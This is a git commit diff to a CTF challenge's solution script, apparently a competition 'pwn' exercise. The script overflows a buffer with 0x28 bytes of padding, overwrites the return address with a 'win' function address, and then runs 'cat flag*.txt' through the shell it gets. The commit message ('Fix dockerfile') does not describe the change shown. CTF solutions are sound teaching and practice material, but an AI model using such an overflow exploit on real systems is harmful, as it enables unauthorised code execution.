0866bc022415af43aff0fd6ceda6068e4ab4a175
Yudai Fujiwara <ptr.yudai+dev@gmail.com>
2023-03-09 01:02:19 +0900

    Fix dockerfile

--- pwn/before_write/solution/solve.py
+++ pwn/before_write/solution/solve.py
@@ -1,4 +1,5 @@
 from ptrlib import *
+import time
 import os
 
 HOST = os.getenv("HOST", "localhost")
@@ -10,5 +11,8 @@ sock = Socket(HOST, PORT)
 payload  = b"A"*0x28
 payload += p64(elf.symbol("win"))
 sock.sendafter("value: ", payload)
+
+time.sleep(0.5)
+sock.sendline("cat flag*.txt")
 
 sock.sh()
